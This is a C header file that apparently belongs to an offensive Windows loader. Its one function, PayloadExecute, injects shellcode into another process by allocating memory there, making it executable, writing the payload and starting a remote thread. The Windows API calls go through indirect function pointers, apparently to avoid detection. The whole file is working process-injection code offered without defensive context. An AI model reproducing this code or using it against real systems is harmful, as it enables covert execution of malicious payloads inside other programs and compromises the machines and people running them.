#pragma once
#include "api.h"
#include <stdio.h>
#include <Windows.h>

BOOL PayloadExecute(IN HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress			= NULL;
	hThread				= NULL;
	DWORD		dwOldProtection		= 0x00;
	SIZE_T		sNmbrOfBytesWritten = NULL;

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = (PBYTE)pVirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!pVirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!pWriteProcessMemory(hProcess, pAddress, pShellcodeAddress, sShellcodeSize, &sNmbrOfBytesWritten) || sShellcodeSize != sNmbrOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", GetLastError(), (int)sNmbrOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	if (!(hThread = pCreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateRemoteThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	*ppInjectionAddress		= pAddress;
	if (phThread)
		*phThread			= hThread;

	// Just for testing purposes (TO REMOVE)
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}